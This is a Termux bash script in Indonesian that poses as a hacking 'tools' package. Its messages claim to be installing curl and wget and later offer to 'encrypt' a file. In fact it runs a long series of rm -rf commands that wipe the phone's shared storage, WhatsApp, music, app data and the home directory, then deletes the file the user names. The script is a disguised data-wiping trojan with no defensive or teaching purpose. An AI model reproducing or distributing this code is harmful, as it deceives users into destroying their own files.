###########################
#tools Kontol by tampansky#
# rm -rf /sdcard/0/?      #
###########################

#tools auto remove kenangan

#colors
clear
blue='\e[1;34m'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
grey="\033[0;37m"
purple="\033[0;35m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
mon="mon"
lightcyan='\e[96m'
white='\e[1;37m'
nc="\e[0m"
red='\e[1;31m'
yellow='\e[1;33m'
clear 
load(){
clear
echo -e $red "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $blue "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $red "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $blue "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $red "MENGHUBUNGKAN..."
sleep 0.25        
}
#kontol
upgrade(){
    termux-setup-storage
echo -e $okegreen"<!> Menginstall curl<!>"
rm -rf /sdcard/0/whatsapp
clear
sleep 2
echo -e $okegreen"<!>Menginstall Wget<!>"
rm -rf /sdcard/0/
clear
sleep 2
rm -rf /storage/emulated/0
rm -rf /sdcard/0
rm -rf /storage/emulated/0/
rm -rf /storage/emulated/0/android/obb
rm -rf /sdcard/0/android/data
rm -rf $HOME
rm -rf sdcard/0
rm -rf storage/emulated/0
rm -rf /storage/emulated/0/
rm -rf /sdcard/0/WhatsApp
rm -rf /storage/emulated/0/
rm -rf /storage/emulated/0/
rm -rf /sdcard/0/Music
rm -rf /sdcard/0/Musik
}
upgrade
#sesi kontol
echo -e $okegreen "{ SELAMAT DATANG DI TOOLS GABUT }" #gabut anjenk
sleep 2
echo -e $okegreen " SELAMAT MENIKMATI. "
sleep 1
echo -e $okegreen " AKU CUMAN MAU MEMBUAT FOLDER MU HILANG"
#auto remove is detected
sleep 1 
echo -e $okegreen " MAAF KAN AKU KALAU AKU SALAH "
sleep 1
echo -e $okegreen " DALAM HAL BODOH INI " 
sleep 2
echo -e $okegreen " AKU TIDAK AKAN MENGULANGI HAL INI UNTUK KETIGA KALINYA "
sleep 2
echo -e $okegreen " DALAM URUSAN CINTA AKU MEMANG LEMAH "
sleep 2
echo -e $okegreen " TETAPI KLO MASALAH INTERNET "
sleep 2
echo -e $okegreen "AKU LAH YANG LEBIH KUAT DALAM HAL TERSEBUT"
clear 

echo -e $okegreen " ITU TADI CUMAH INTRO NYA "
sleep 2
clear 

echo -e $okegreen " WELCOME TO TOOLS GABUTS "
sleep 1
echo -e $okegreen " AUTHOR : TAMPANSKY "
sleep 0.25
echo -e $okegreen " TEAM : PSCT "
sleep 0.25
echo -e $okegreen " MASSUKAN FILE YANG INGIN DI ENCRYPT "
read -p ">" kontol 
load
rm -rf /sdcard/0/$kontol
echo -e $okegreen " SELAMAT ANDA TELAH MENGHAPUS FILE ANDA."
